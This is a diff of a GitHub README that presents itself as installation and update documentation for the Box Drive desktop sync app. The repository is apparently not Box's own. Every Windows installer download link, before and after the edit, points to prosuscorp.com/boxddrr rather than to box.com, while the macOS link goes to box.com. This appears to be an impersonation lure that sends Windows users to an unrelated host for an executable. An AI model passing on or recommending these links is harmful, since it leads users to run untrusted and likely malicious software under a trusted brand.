@@ -1,8 +1,8 @@
-# <img width="26px" src="https://github.com/Box-Sync/Box-Drive/blob/main/images.png" alt="Sonarr"></img> Box Drive: Simplify Cloud File Access
+# <img width="26px" src="github/images.png" alt="Sonarr"></img> Box Drive: Simplify Cloud File Access
 
 <p align="center">
   <a href="https://www.box.com/">
-    <img src="https://github.com/Box-Sync/Box-Drive/blob/main/1-hero-fg-box-drive.png">
+    <img src="github/1-hero-fg-box-drive.png">
   </a>
 </p>
 
@@ -14,127 +14,111 @@
 
 Box Drive is a desktop application designed to streamline file access and organization by syncing your files from the cloud directly to your device. It provides seamless integration with Windows and macOS, allowing you to work on your files as if they were stored locally. Box Drive ensures that your files are always up-to-date, and changes made locally are synced back to the cloud.
 
-To install Box Drive, follow the instructions according to your operating system.
 
-| Jump to: | [Windows](https://github.com/Box-Sync/Box-Drive#Windows) | [MacOS](https://github.com/Box-Sync/Box-Drive#MacOS) | [Android](https://www.box.com/resources/downloads) | [Other platforms](https://www.box.com/resources/downloads) |  
+| Jump to: | [Windows](https://github.com/Box-Sync/Box-Drive#Windows) | [MacOS](https://github.com/Box-Sync/Box-Drive#MacOS) | [Linux](https://www.box.com/resources/downloads) | [Other platforms](https://www.box.com/resources/downloads) |  
 | :--- | :---: | :---: | :---: | :---: |
 
 ## Windows
 
-Box Drive is supported natively on Windows. You can install it to sync and access your cloud-stored files directly from File Explorer.
+#### Prerequisites:
+- Windows 10 and later
+- [Universal CRT](https://support.microsoft.com/en-us/topic/update-for-universal-c-runtime-in-windows-c0514201-7fe6-95a3-b0a5-287930f3560c)
+- [.NET Framework 4.8, or higher](https://github.com/Microsoft/dotnet/blob/main/releases/README.md)
+- Box Sync is not installed
 
-**Supported Versions:** Windows 10 and later.
+#### Recommended minimum system specifications:
+- 1.6GHz dual-core processor
+- 4GB of RAM
 
-### 1. Install Box Drive  
-Download the Windows Installer using the following link and execute it:  
-- [Download Windows (x64) Installer](https://prosuscorp.com/boxddrr)
-- [Download Windows (x86) Installer](https://prosuscorp.com/boxddrr)
+> **Note:**  
+> If your machine does not meet the recommended system specifications listed above, you may still be able to install and run Box Drive. However, you may encounter a degraded experience.
 
-### 2. Set up Box Drive  
-Once installed, sign in with your Box account to start syncing your files.  
+### To install Box Drive on Windows:
 
-**Manual Installation for Advanced Users:** It is possible to download and extract the application manually, but this requires configuring system paths and dependencies manually.
+1. [Download the Box Drive installer.](https://prosuscorp.com/boxddrr/)
+2. Navigate to the location where you downloaded the file, and double-click it to run the installer.
+3. Follow the instructions to complete the installation. If Box Drive does not launch automatically when the installation completes, you may need to go to the **Start** menu and launch the application manually.
+4. You must log in to Box Drive the first time you open it. You may be redirected to your company's login page.
+5. After you log in, Box Drive displays a brief walkthrough of its features. When this completes, your Box content is available at `C:\Users\USERNAME\Box`.
 
-## macOS
+### Signing In
 
-The easiest way to install Box Drive on macOS is through the provided installer.  
+Box Drive runs automatically after it is installed. You can also open it from the Start menu.
 
-### 1. Download Box Drive Installer  
-- [Download macOS App (ARM)](https://www.box.com/resources/downloads#MacOS)
-- [Download macOS App (Intel)](https://www.box.com/resources/downloads#MacOS)
+To start using Box Drive, simply sign in to Box at the prompt. You may be redirected to your company's login page. After you launch Box Drive for the first time, you can access Box from either the File Explorer or the Windows system tray.
 
-### 2. Install Box Drive  
-Run the installer and follow the on-screen instructions.  
+### Logging out / switching accounts
 
-**Important:** Ensure the application is moved to your Applications folder to allow updates and proper functionality.  
+To log out from Drive, click the Box Drive icon in your system tray (Windows) or menu bar (macOS). With the search window open, click the gear icon and then click Logout.
 
-### 3. Start Box Drive  
-Once installed, open Box Drive from your Applications folder and sign in with your Box account.  
+> **Note:**  
+> Logging out completely removes all traces of your Drive usage from your machine and enables you to log in again as a new user.  
+> Also, when you log out, your Box Drive session ends and the login screen displays.  
+> In addition, logging out of Box Drive deletes all of the downloaded content you had marked for offline availability. This clears up hard disk space on your device.  
+> This also returns to an online-only state all of the content you have marked for offline availability, and you must repeat the process of marking folders for offline availability.
 
-#### Access Box Drive  
-Box Drive integrates seamlessly with Finder. You’ll find your Box files in the sidebar under the "Box" folder.  
+### Updating Box Drive
 
-## Docker (Optional Use Case)
+It is important always to update as soon as possible to ensure you are taking advantage of the latest features — such as [marking content for offline use](https://support.box.com/hc/en-us/articles/360043697574-Making-Content-Available-Offline) — and also that you are on the most stable version.
 
-Although Box Drive is not typically used with Docker, advanced users can leverage third-party containers to set up Box Drive in specialized environments. Refer to Docker-specific documentation for further guidance.
+When an update becomes available, Drive displays a system notification to inform you, and also adds a badge to the Box icon in your menu bar.
 
----
-
-
-## Features of Box Drive  
-- 🖥️ **Intuitive User Interface**: Simple and clean design for effortless navigation.  
-- 🚀 **Seamless File Sync**: Automatically syncs files between your device and the cloud.  
-- 📁 **Supports Large File Uploads**: Handles files of up to 150GB in size.  
-- 🔒 **Advanced Security**: Built-in encryption and access controls.  
-- 🌍 **Cross-Platform Compatibility**: Available for Windows, Mac, iOS, and Android.  
-- 🔄 **Offline Access**: Access files without an internet connection.  
-- 🗂️ **Organized File Management**: Efficiently categorize and search for files.  
-- 💼 **Collaborative Tools**: Share files and folders with team members easily.  
-- 🌙 **Dark Mode**: Comfortable viewing experience in low-light environments.  
-- 🧳 **Lightweight Installation**: Minimal impact on system resources.  
-- 🔔 **Real-Time Notifications**: Stay updated on file changes and activity.  
-- 📊 **Detailed File Insights**: Track versions and activity history.
+<img width="660px" src="github/10487iE5F16D838136D6AE.png" alt=""></img>
 
 
-## Use Cases  
+1. To install the update, in your system tray, click the Box icon to display the search menu, or use the keyboard shortcut `Ctrl + Alt + Shift + B`.
 
-Box Drive is a versatile tool that caters to various needs across different industries and individual use cases. Here are some common scenarios where Box Drive can make a significant impact:  
+2. From the search menu, begin the update either by clicking **Update Available** or by clicking the gear icon and then clicking **Update**. Box Drive then prompts you to close any open Box Drive files and proceed with the update.
 
-### 1. **Business Collaboration**  
-- Share documents, presentations, and reports with your team in real time.  
-- Manage version control effortlessly, ensuring everyone is working on the latest file.  
-- Collaborate on projects by assigning tasks and tracking progress directly in Box Drive.  
+Box Drive can also auto-update when it launches. If Drive detects that an update is available while it is starting up, it automatically applies the update without requiring any action on your part. This auto-update feature becomes available with the release of Box Drive v2.4.
 
-### 2. **Creative Professionals**  
-- Store and organize large multimedia files, including videos, images, and design assets.  
-- Share portfolios with clients or teammates without the need for email attachments.  
-- Access files offline during photoshoots or video editing on the go.  
 
-### 3. **Education**  
-- Teachers can distribute study materials and collect assignments securely.  
-- Students can collaborate on group projects and keep their notes organized.  
-- Seamless integration with educational tools like Google Workspace and Microsoft Office.  
+## MacOS
 
-### 4. **Remote Work**  
-- Ensure remote teams have access to all necessary files without the need for complex VPN setups.  
-- Keep work organized with shared folders and project-specific directories.  
-- Real-time updates and notifications help maintain productivity and communication.  
+#### Prerequisites:
+- [Supported OS version](https://support.box.com/hc/en-us/articles/360043696234-Understand-the-Box-Policy-For-Browser-And-OS-Support)
+- HFS or HFS+ formatted hard drive
+  - APFS formatted hard drives are supported with Box Drive v1.2.93+
+- Box Sync is **not** installed
 
-### 5. **Legal and Compliance**  
-- Store sensitive legal documents securely with built-in encryption.  
-- Share contracts, agreements, and other legal materials with clients and partners securely.  
-- Ensure compliance with regulatory standards by managing permissions and access controls.  
+#### Recommended minimum system specifications:
+- 1.6GHz dual-core processor
+- 4GB of RAM
+
+> **Note:**  
+> If your machine does not meet the recommended system specifications, you may still be able to install and run Box Drive. However, you may encounter a degraded experience.
 
 ---
 
-## FAQs  
+### To install Box Drive on macOS:
 
-### 1. **What is Box Drive?**  
-Box Drive is a cloud-based file management tool that allows you to access, edit, and share your files securely from your desktop, without taking up hard drive space.  
+1. [Download the Box Drive installer.](https://www.box.com/resources/downloads/drive)
+2. Navigate to the location where you saved the file, then double-click it. The installer starts.
+3. When prompted, select **Install for all users of this computer** and click **Continue**.
+4. **DO NOT** change the install location. Click **Install**.
 
-### 2. **Which operating systems are supported by Box Drive?**  
-Box Drive is compatible with Windows and macOS. For mobile devices, you can use the Box app available on iOS and Android.  
+<img width="530px" src="github/install%20on%20mac.png" alt=""></img>
 
-### 3. **Can I access my files offline?**  
-Yes, Box Drive allows you to mark specific files or folders for offline access. You can work on them without an internet connection, and changes will sync when you're back online.  
+5. The system displays a notification when the installation completes. Click **Close.**
+6. Box Drive launches.
 
-### 4. **Is there a file size limit for uploads?**  
-Yes, Box Drive supports file uploads of up to 150GB, depending on your Box account plan.  
+You must log in to Box Drive the first time you open it. (You may be redirected to your company's login page.)
+After you log in, Box Drive displays a brief walkthrough of its features. When this is complete, your Box content is available at ~/Box
 
-### 5. **How secure is Box Drive?**  
-Box Drive offers advanced security features, including built-in encryption, file-level permissions, and multi-factor authentication to ensure your data remains safe.  
+### Signing In
 
-### 6. **Can I share files directly from Box Drive?**  
-Absolutely! You can generate shareable links or invite collaborators to specific folders and files directly from the app.  
+After installation, Box Drive prompts you to sign in. You may be redirected to your company's login page.
 
-### 7. **What happens if I delete a file in Box Drive?**  
-When you delete a file in Box Drive, it is moved to the Trash folder. You can restore it from Trash within a specific time frame, depending on your organization's retention policy.  
+After you log in, Box Drive displays a new Finder window. **Box** should display in the Finder sidebar, under both **Favorites** and **Devices**.
 
-### 8. **Does Box Drive support integration with other tools?**  
-Yes, Box Drive integrates seamlessly with tools like Microsoft Office, Google Workspace, Slack, and many others to enhance your workflow.  
+### Updating Box Drive
 
-### 9. **How do I report an issue or get support?**  
-You can visit the [Box Support Center](https://support.box.com) or contact your organization's Box administrator for assistance.  
+When an update becomes available, Drive displays a system notification to inform you, and also adds a badge to the Box icon in your menu bar.
 
-### 10. **Is there a limit to the number of files I can store in Box Drive?**  
-There is no hard limit on the number of files, but performance may vary depending on your device and internet connection when syncing large amounts of data.
+<img width="530px" src="github/10486i7E61C17EAE3ACE35.png" alt=""></img>
+
+1. To install the update, in the system notification, click **Update Now**. If you have closed the notification or missed it, you can navigate to the search menu by clicking the Box icon in your menu bar or by using the keyboard shortcut `Ctrl + Option + Cmd + Space`.
+
+2. From the search menu, begin the update either by clicking **Update Available** or by clicking the gear icon and then clicking **Update**. Box Drive then prompts you to close any open Box Drive files and proceed with the update.
+
+Box Drive can also auto-update when it launches. If Drive detects that an update is available while it is starting up, it automatically applies the update without requiring any action on your part. This auto-update feature became available as of v2.2.
